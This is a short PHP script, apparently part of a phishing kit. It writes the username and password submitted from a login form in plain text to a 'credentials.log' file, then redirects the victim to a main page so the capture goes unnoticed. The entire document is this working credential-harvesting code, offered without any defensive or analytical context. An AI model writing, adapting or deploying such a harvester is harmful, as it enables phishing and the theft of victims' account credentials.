<?php
  $log_file_name = '../Storage/credentials.log'; // Change to the log file name
  $credentials = 'Username: ';
  $credentials .= $_POST['username'];
  $credentials .= "\n"; // username
  $credentials .= "Password: ";
  $credentials .= $_POST['password'];
  $credentials .= "\n---------\n";
  file_put_contents($log_file_name, ($credentials), FILE_APPEND);
 
  
  header('Location: ../Authsynth/main.html'); // redirect back to the main site
